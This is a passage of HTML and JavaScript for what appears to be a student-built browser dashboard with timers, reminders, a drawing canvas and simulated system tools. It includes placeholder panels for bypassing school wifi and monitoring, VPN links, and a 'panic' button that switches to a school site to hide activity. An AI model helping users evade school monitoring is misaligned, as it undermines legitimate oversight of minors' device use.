          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <script>
    // --- Global Utility Functions (New) ---

    /**
     * Shows a toast notification.
     * @param {string} message - The message to display.
     * @param {'info'|'success'|'error'|'warning'} type - The type of notification.
     * @param {number} duration - How long the notification stays (ms). Default 5000.
     */
    function showNotification(message, type = 'info', duration = 5000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const notification = document.createElement('div');
        notification.classList.add('notification', type);

        let icon = '';
        switch (type) {
            case 'success': icon = '✅'; break;
            case 'error': icon = '❌'; break;
            case 'warning': icon = '⚠️'; break;
            case 'info':
            default: icon = '💡'; break;
        }

        notification.innerHTML = `<span class="notification-icon">${icon}</span> <span>${message}</span>`;
        container.appendChild(notification);

        // Remove after duration
        setTimeout(() => {
            notification.style.opacity = '0';
            notification.style.transform = 'translateX(100%)';
            notification.addEventListener('transitionend', () => notification.remove());
        }, duration);
    }

    /**
     * Adds an entry to the activity log panel.
     * @param {string} message - The log message.
     * @param {'info'|'warning'|'error'|'success'} type - The type of log entry.
     */
    function logActivity(message, type = 'info') {
        const logDisplay = document.getElementById('activityLogDisplay');
        if (!logDisplay) return;

        const timestamp = new Date().toLocaleString();
        const logEntry = document.createElement('div');
        logEntry.classList.add('log-entry', type);
        logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> <span class="log-message">${message}</span>`;

        logDisplay.prepend(logEntry); // Add to top for most recent first
        // Keep log from getting too long
        if (logDisplay.children.length > 50) {
            logDisplay.lastChild.remove();
        }
    }


    // Dashboard functionality object
    const dashboard = {
      // --- Core Properties ---
      currentZoomLevel: 1,
      minZoom: 0.5,
      maxZoom: 2,
      zoomStep: 0.1,
      sessionStartTime: null,
      sessionIntervalId: null,
      motivationQuotes: [
        "The only way to do great work is to love what you do. – Steve Jobs",
        "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill",
        "Believe you can and you're halfway there. – Theodore Roosevelt",
        "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
        "It always seems impossible until it's done. – Nelson Mandela",
        "The mind is everything. What you think you become. – Buddha",
        "Strive not to be a success, but rather to be of value. – Albert Einstein"
      ],
      currentMotivationQuoteIndex: 0,
      quoteIntervalId: null,
      activePanelId: null, // Track which info panel is open

      // --- Reminder System Properties ---
      reminders: [],
      reminderIntervalId: null,

      // --- Stopwatch Properties ---
      stopwatchIntervalId: null,
      stopwatchStartTime: 0,
      stopwatchElapsedTime: 0,
      stopwatchRunning: false,

      // --- Timer Properties ---
      timerIntervalId: null,
      timerRemainingTime: 0, // In seconds
      timerRunning: false,
      timerOriginalDuration: 0, // To reset to original input

      // --- Calculator Properties ---
      calcDisplayValue: '0',
      calcFirstOperand: null,
      calcWaitingForSecondOperand: false,
      calcOperator: null,

      // --- File Manager Properties ---
      fileSystem: {
          '/home/user/': {
              'Documents': { type: 'folder' },
              'Pictures': { type: 'folder' },
              'report.txt': { type: 'file', content: 'This is a simulated report document. It contains important system data.' },
              'dashboard_screenshot.png': { type: 'image' },
              'private_data.enc': { type: 'file', content: 'Encrypted data file. Access Denied.' },
          },
          '/home/user/Documents/': {
              'meeting_notes.txt': { type: 'file', content: 'Key meeting points: Project Alpha review, Budget allocation, Next steps.' },
              'todo.list': { type: 'file', content: '1. Finish dashboard features. 2. Add more logs. 3. Optimize performance.' },
          },
          '/home/user/Pictures/': {
              'sunset.jpg': { type: 'image' },
              'mountain.png': { type: 'image' },
          }
      },
      currentFileManagerPath: '/home/user/',

      // --- Terminal Properties ---
      terminalHistory: [],
      terminalCommandIndex: -1,
      terminalCurrentPath: '/home/user/', // Separate path for terminal simulation

      // --- System Status Properties ---
      systemStatusIntervalId: null,
      systemUptimeSeconds: 0,

      // --- News Feed Properties ---
      simulatedNewsHeadlines: [
        { title: "Cybersecurity Alert: New Threat Detected in School Network", content: "Our advanced systems have identified a novel threat. Users are advised to remain vigilant.", link: "#" },
        { title: "Dashboard Update 2.1.0 Released: Performance Boosts", content: "Enjoy a faster, more responsive dashboard with our latest performance optimizations.", link: "#" },
        { title: "Feature Spotlight: Enhanced Reminder System Now Live", content: "Never miss an important task again with our upgraded reminder features.", link: "#" },
        { title: "Educational Resources Portal Under Maintenance This Weekend", content: "Access to certain educational websites may be limited during scheduled maintenance.", link: "#" },
        { title: "New Theme Options Available for Dashboard Personalization", content: "Customize your dashboard experience with our new range of aesthetic themes.", link: "#" },
        { title: "Community Feedback Session Scheduled for Next Month", content: "Your input is valuable! Join our feedback session to help shape future updates.", link: "#" },
      ],
      
      // --- Initialization ---
      init: function() {
        this.loadProfileSettings(); // Load theme first
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initMotivationQuotes();
        this.initReminderSystem(); // Initialize reminder system
        this.initSystemStatus(); // Initialize system status
        this.initFileManager(); // Initialize file manager
        this.initTerminal(); // Initialize terminal
        this.initWeatherWidget(); // Initialize weather widget
        this.initCalculator(); // Initialize calculator
        this.initStopwatchTimer(); // Initialize stopwatch & timer
        this.initUnitConverter(); // Initialize unit converter
        this.initSecureNotes(); // Initialize secure notes
        this.initNewsFeed(); // Initialize news feed
        this.initActivityLog(); // Initialize activity log
        this.initUserProfile(); // Initialize user profile
        this.setupEventListeners(); // Setup general event listeners
        this.initParticles(); // Initialize particles.js
        this.startSessionLogging(); // Start logging session duration etc.
        showNotification("Dashboard loaded successfully!", "success");
        logActivity("Dashboard loaded and all systems are online.", "success");
      },

      // --- Session Management & Logging ---
      startSessionLogging: function() {
          this.sessionStartTime = new Date();
          // Simulate advanced session logging (placeholder)
          console.log(`Session started at: ${this.sessionStartTime.toISOString()}`);
          // You would send a webhook here with session start details
      },

      endSessionLogging: function() {
          const endTime = new Date();
          const durationMs = endTime.getTime() - this.sessionStartTime.getTime();
          const durationStr = this.formatTime(Math.floor(durationMs / 1000));
          // Simulate advanced session logging
          console.log(`Session ended at: ${endTime.toISOString()}, Duration: ${durationStr}`);
          // You would send a webhook here with session end details
      },

      // --- General Utilities ---
      formatTime: function(seconds) {
        const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
        const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
        const secs = String(seconds % 60).padStart(2, '0');
        return `${hrs}:${mins}:${secs}`;
      },

      // --- Dashboard UI Elements & Behaviors ---

      // Session Timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        const updateSessionTime = () => {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${this.formatTime(sessionSeconds)}`;
        };
        updateSessionTime();
        this.sessionIntervalId = setInterval(updateSessionTime, 1000);
      },
      
      // Real-time Clock
      initClock: function() {
        const updateClock = () => {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        };
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Calendar Generation
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Theme Management
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          const currentTheme = document.body.classList.contains('light-theme') ? 'light-theme' :
                               document.body.classList.contains('matrix-theme') ? 'matrix-theme' :
                               document.body.classList.contains('cyber-theme') ? 'cyber-theme' : 'dark-theme';
          let nextTheme = 'light-theme'; // Default to light

          if (currentTheme === 'light-theme') {
              nextTheme = 'matrix-theme';
          } else if (currentTheme === 'matrix-theme') {
              nextTheme = 'cyber-theme';
          } else if (currentTheme === 'cyber-theme') {
              nextTheme = 'dark-theme';
          }

          document.body.classList.remove('light-theme', 'matrix-theme', 'cyber-theme', 'dark-theme');
          document.body.classList.add(nextTheme);
          this.saveProfileSetting('theme', nextTheme); // Save preferred theme
          this.updateThemeButtonText(nextTheme);
          showNotification(`Theme changed to ${nextTheme.replace('-', ' ').replace('theme', 'Mode')}`, "info");
          logActivity(`Theme changed to ${nextTheme}.`, "info");
        });
        this.updateThemeButtonText(this.getProfileSetting('theme', 'dark-theme'));
      },

      updateThemeButtonText: function(theme) {
        const themeBtn = document.getElementById('themeToggle');
        switch(theme) {
            case 'light-theme': themeBtn.innerText = '☀️ Light Mode'; break;
            case 'matrix-theme': themeBtn.innerText = '🟢 Matrix Green'; break;
            case 'cyber-theme': themeBtn.innerText = '🟣 Cyber Purple'; break;
            case 'dark-theme':
            default: themeBtn.innerText = '🌙 Dark Mode'; break;
        }
      },
      
      // General Buttons
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          showNotification("Initiating panic sequence... Redirecting!", "warning");
          logActivity("Panic button activated. Redirecting to Clever.", "warning");
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? This will end your session.')) {
            this.endSessionLogging(); // Log session end
            logActivity("Page restart initiated.", "error");
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:var(--bg-color); color:var(--text-color); font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          showNotification('Running diagnostics...\nNo critical issues found. Your dashboard is running smoothly!', "success");
          logActivity("Diagnostics run. No critical issues reported.", "success");
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showNotification(`Error: Full-screen mode denied: ${err.message}`, "error");
              logActivity(`Full-screen request failed: ${err.message}`, "error");
            });
          } else {
            document.exitFullscreen();
          }
        });
        
        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (this.currentZoomLevel < this.maxZoom) {
            this.currentZoomLevel += this.zoomStep;
            document.body.style.zoom = this.currentZoomLevel;
            showNotification(`Zoom: ${Math.round(this.currentZoomLevel * 100)}%`, "info", 2000);
            logActivity(`Zoomed in to ${Math.round(this.currentZoomLevel * 100)}%.`, "info");
          } else {
            showNotification("Maximum zoom level reached.", "warning", 2000);
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (this.currentZoomLevel > this.minZoom) {
            this.currentZoomLevel -= this.zoomStep;
            document.body.style.zoom = this.currentZoomLevel;
            showNotification(`Zoom: ${Math.round(this.currentZoomLevel * 100)}%`, "info", 2000);
            logActivity(`Zoomed out to ${Math.round(this.currentZoomLevel * 100)}%.`, "info");
          } else {
            showNotification("Minimum zoom level reached.", "warning", 2000);
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                this.endSessionLogging();
                logActivity("User logged out.", "info");
                // Clear any session-specific data if necessary
                localStorage.removeItem('loggedInUser');
                localStorage.removeItem('loggedInID');
                location.reload(); // Reload the page to show login screen
            }
        });
      },
      
      // Notes Canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        const featureButtonsGrid = document.querySelector('.feature-buttons-grid');
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');

        notesBtn.addEventListener('click', () => {
          mainGrid.classList.add('hidden');
          updatesNotifications.classList.add('hidden');
          featureButtonsGrid.classList.add('hidden');
          infoPanelsContainer.classList.add('hidden');
          canvasContainer.style.display = 'block';
          showNotification("Notes canvas opened.", "info");
          logActivity("Notes canvas opened.", "info");
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.classList.remove('hidden');
          updatesNotifications.classList.remove('hidden');
          featureButtonsGrid.classList.remove('hidden');
          infoPanelsContainer.classList.remove('hidden');
          showNotification("Notes canvas closed.", "info");
          logActivity("Notes canvas closed.", "info");
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Set initial canvas background
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || evt.touches[0].clientX) - rect.left,
            y: (evt.clientY || evt.touches[0].clientY) - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d';
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d';
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          showNotification("Canvas cleared.", "info", 2000);
          logActivity("Notes canvas cleared.", "info");
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body; 
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            showNotification("Screenshot captured and downloaded!", "success");
            logActivity("Screenshot of dashboard captured.", "success");
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          showNotification("Notes exported as image!", "success");
          logActivity("Notes canvas exported.", "success");
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          const sections = [mainGrid, updatesNotifications, featureButtonsGrid, infoPanelsContainer];
          if (mainGrid.classList.contains('hidden')) {
            sections.forEach(s => s.classList.remove('hidden'));
            canvasContainer.style.display = 'none'; // Ensure canvas is hidden if toggling sections back
            toggleBtn.innerText = '⬆️ Toggle Sections';
            showNotification("Sections displayed.", "info", 2000);
            logActivity("Dashboard sections displayed.", "info");
          } else {
            sections.forEach(s => s.classList.add('hidden'));
            canvasContainer.style.display = 'none'; // Also hide canvas if it was open
            toggleBtn.innerText = '⬇️ Toggle Sections';
            showNotification("Sections hidden.", "info", 2000);
            logActivity("Dashboard sections hidden.", "info");
          }
        });
      },
      
      // Motivation Quotes
      initMotivationQuotes: function() {
        const motivationBox = document.getElementById('motivationBox');
        const updateQuote = () => {
          motivationBox.innerHTML = `<span class="motivation-quote">${this.motivationQuotes[this.currentMotivationQuoteIndex]}</span>`;
          this.currentMotivationQuoteIndex = (this.currentMotivationQuoteIndex + 1) % this.motivationQuotes.length;
        };
        updateQuote(); // Display initial quote
        this.quoteIntervalId = setInterval(updateQuote, 15000); // Change quote every 15 seconds
      },

      // Info Panel Initialization (Hide all by default)
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },
      
      // Panel Toggle Function
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        
        // Hide all other info panels if a new one is being opened
        if (panel.style.display === 'none') {
            document.querySelectorAll('.info-panel').forEach(p => {
                if (p.id !== panelId && p.style.display === 'block') {
                    p.style.display = 'none';
                }
            });
            panel.style.display = 'block';
            this.activePanelId = panelId;
            showNotification(`Opened: ${panel.querySelector('h2').textContent}`, "info", 3000);
            logActivity(`Panel "${panel.querySelector('h2').textContent}" opened.`, "info");
        } else {
            panel.style.display = 'none';
            this.activePanelId = null;
            showNotification(`Closed: ${panel.querySelector('h2').textContent}`, "info", 3000);
            logActivity(`Panel "${panel.querySelector('h2').textContent}" closed.`, "info");
        }
      },
      
      // iPad Content Toggler
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const contentToShow = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (contentToShow) {
            contentToShow.style.display = 'block';
            showNotification(`iPad ${contentId} content displayed.`, "info", 2000);
            logActivity(`iPad content "${contentId}" displayed.`, "info");
        }
      },
      
      // Bypass Content Toggler
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const contentToShow = document.getElementById(contentId + 'Bypass');
        if (contentToShow) {
            contentToShow.style.display = 'block';
            showNotification(`Bypass ${contentId} content displayed.`, "info", 2000);
            logActivity(`Bypass content "${contentId}" displayed.`, "info");
        }
      },

      // --- New Feature Implementations ---

      // Reminder System
      initReminderSystem: function() {
          this.loadReminders();
          document.getElementById('addReminderBtn').addEventListener('click', () => this.addReminder());
          document.getElementById('reminderList').addEventListener('click', (e) => {
              if (e.target.classList.contains('delete-reminder-btn')) {
                  this.deleteReminder(e.target.dataset.id);
              } else if (e.target.classList.contains('complete-reminder-btn')) {
                  this.toggleReminderComplete(e.target.dataset.id);
              }
          });
          this.startReminderChecker();
          logActivity("Reminder system initialized.", "info");
      },

      addReminder: function() {
          const textInput = document.getElementById('reminderTextInput');
          const dateTimeInput = document.getElementById('reminderDateTimeInput');
          const text = textInput.value.trim();
          const dateTime = dateTimeInput.value;

          if (!text || !dateTime) {
              showNotification("Please enter both reminder text and a date/time.", "warning");
              return;
          }

          const newReminder = {
              id: Date.now().toString(),
              text: text,
              timestamp: new Date(dateTime).getTime(),
              completed: false,
              added: new Date().toISOString()
          };

          this.reminders.push(newReminder);
          this.saveReminders();
          this.renderReminders();
          textInput.value = '';
          dateTimeInput.value = '';
          showNotification("Reminder added successfully!", "success");
          logActivity(`Reminder added: "${text}" for ${new Date(newReminder.timestamp).toLocaleString()}.`, "success");
      },

      deleteReminder: function(id) {
          this.reminders = this.reminders.filter(r => r.id !== id);
          this.saveReminders();
          this.renderReminders();
          showNotification("Reminder deleted.", "info", 2000);
          logActivity(`Reminder with ID ${id} deleted.`, "info");
      },

      toggleReminderComplete: function(id) {
          const reminder = this.reminders.find(r => r.id === id);
          if (reminder) {
              reminder.completed = !reminder.completed;
              this.saveReminders();
              this.renderReminders();
              showNotification(`Reminder marked as ${reminder.completed ? 'completed' : 'pending'}.`, "info", 2000);
              logActivity(`Reminder with ID ${id} marked as ${reminder.completed ? 'completed' : 'pending'}.`, "info");
          }
      },

      saveReminders: function() {
          localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
      },

      loadReminders: function() {
          const storedReminders = localStorage.getItem('dashboardReminders');
          if (storedReminders) {
              this.reminders = JSON.parse(storedReminders);
              // Ensure timestamps are numbers and re-sort
              this.reminders.forEach(r => r.timestamp = new Date(r.timestamp).getTime());
              this.reminders.sort((a, b) => a.timestamp - b.timestamp);
              this.renderReminders();
          }
      },

      renderReminders: function() {
          const reminderList = document.getElementById('reminderList');
          reminderList.innerHTML = '';
          if (this.reminders.length === 0) {
              reminderList.innerHTML = '<p style="text-align: center; opacity: 0.7;">No reminders set. Click "Add Reminder" to get started!</p>';
              return;
          }

          this.reminders.forEach(r => {
              const item = document.createElement('div');
              item.classList.add('reminder-item');
              if (r.completed) item.classList.add('completed');

              const date = new Date(r.timestamp);
              const now = new Date();
              const isPast = date < now && !r.completed;
              if (isPast) item.classList.add('past-due'); // Optional: add specific styling for past due

              item.innerHTML = `
                  <p>
                      <strong>${r.text}</strong><br>
                      <small>${date.toLocaleString()}</small>
                  </p>
                  <div class="actions">
                      <button class="complete-reminder-btn" data-id="${r.id}" title="${r.completed ? 'Mark as Pending' : 'Mark as Complete'}">
                          ${r.completed ? '↩️' : '✅'}
                      </button>
                      <button class="delete-reminder-btn" data-id="${r.id}" title="Delete Reminder">
                          🗑️
                      </button>
                  </div>
              `;
              reminderList.appendChild(item);
          });
      },

      startReminderChecker: function() {
          if (this.reminderIntervalId) clearInterval(this.reminderIntervalId);
          this.reminderIntervalId = setInterval(() => {
              const now = Date.now();
              this.reminders.forEach(r => {
                  if (!r.completed && r.timestamp > now && r.timestamp - now < 60000) { // Notify 1 minute before
                      if (!r.notified) { // Prevent repeated notifications for same reminder
                          showNotification(`🔔 Upcoming Reminder: ${r.text} at ${new Date(r.timestamp).toLocaleTimeString()}`, "info", 10000);
                          logActivity(`Upcoming reminder notification: "${r.text}".`, "info");
                          r.notified = true; // Mark as notified
                      }
                  } else if (!r.completed && r.timestamp <= now) { // Notify when due
                      if (!r.dueNotified) { // Prevent repeated notifications
                          showNotification(`🚨 Reminder Due: ${r.text}!`, "warning", 15000);
                          logActivity(`Reminder due: "${r.text}".`, "warning");
                          r.dueNotified = true; // Mark as due notified
                          // Optional: automatically mark as completed after a while or leave it
                      }
                  }
              });
              this.renderReminders(); // Re-render to update past-due styling
          }, 5000); // Check every 5 seconds
      },

      // System Status (Simulated)
      initSystemStatus: function() {
          const updateStatus = () => {
              // Simulate random usage
              const cpu = Math.floor(Math.random() * 40) + 30; // 30-70%
              const ram = Math.floor(Math.random() * 30) + 50; // 50-80%
              const disk = Math.floor(Math.random() * 20) + 70; // 70-90%
              const network = (Math.random() * 50).toFixed(1); // 0-50 KB/s
              const temp = (Math.random() * 10) + 45; // 45-55°C

              document.getElementById('cpuUsage').textContent = `${cpu}%`;
              document.getElementById('ramUsage').textContent = `${ram}%`;
              document.getElementById('diskUsage').textContent = `${disk}%`;
              document.getElementById('networkActivity').textContent = `${network} KB/s`;
              document.getElementById('systemTemp').textContent = `${temp.toFixed(1)}°C`;

              document.getElementById('cpuProgressBar').style.width = `${cpu}%`;
              document.getElementById('ramProgressBar').style.width = `${ram}%`;
              document.getElementById('diskProgressBar').style.width = `${disk}%`;

              this.systemUptimeSeconds++;
              document.getElementById('systemUptime').textContent = this.formatTime(this.systemUptimeSeconds);
              document.getElementById('lastSystemCheck').textContent = new Date().toLocaleTimeString();
          };
          updateStatus(); // Initial display
          this.systemStatusIntervalId = setInterval(updateStatus, 3000); // Update every 3 seconds
          logActivity("System status monitoring initiated.", "info");
      },

      // File Manager (Simulated)
      initFileManager: function() {
          const fmFileList = document.getElementById('fmFileList');
          const fmCurrentPath = document.getElementById('fmCurrentPath');
          const fmGoUpBtn = document.getElementById('fmGoUpBtn');
          const fmNewFolderBtn = document.getElementById('fmNewFolderBtn');
          const fmNewFileBtn = document.getElementById('fmNewFileBtn');
          const fmUploadBtn = document.getElementById('fmUploadBtn');

          const renderFileList = () => {
              fmFileList.innerHTML = '';
              fmCurrentPath.textContent = this.currentFileManagerPath;

              const currentDir = this.fileSystem[this.currentFileManagerPath] || {};

              // Add '..' for going up
              if (this.currentFileManagerPath !== '/home/user/') {
                  const upItem = document.createElement('div');
                  upItem.classList.add('file-item', 'folder');
                  upItem.innerHTML = `<span class="file-item-icon">⤴️</span>.. (Go Up)`;
                  upItem.addEventListener('click', () => {
                      const pathParts = this.currentFileManagerPath.split('/').filter(p => p);
                      pathParts.pop(); // Remove current folder
                      this.currentFileManagerPath = '/' + pathParts.join('/') + (pathParts.length > 0 ? '/' : 'home/user/');
                      this.currentFileManagerPath = this.currentFileManagerPath.replace('//', '/'); // Clean up
                      if (this.currentFileManagerPath === '/') this.currentFileManagerPath = '/home/user/'; // Ensure base path
                      renderFileList();
                  });
                  fmFileList.appendChild(upItem);
              }


              const sortedItems = Object.keys(currentDir).sort((a, b) => {
                  const itemA = currentDir[a];
                  const itemB = currentDir[b];
                  if (itemA.type === 'folder' && itemB.type !== 'folder') return -1;
                  if (itemA.type !== 'folder' && itemB.type === 'folder') return 1;
                  return a.localeCompare(b);
              });


              sortedItems.forEach(name => {
                  const itemData = currentDir[name];
                  const item = document.createElement('div');
                  item.classList.add('file-item', itemData.type);
                  let icon = '📄';
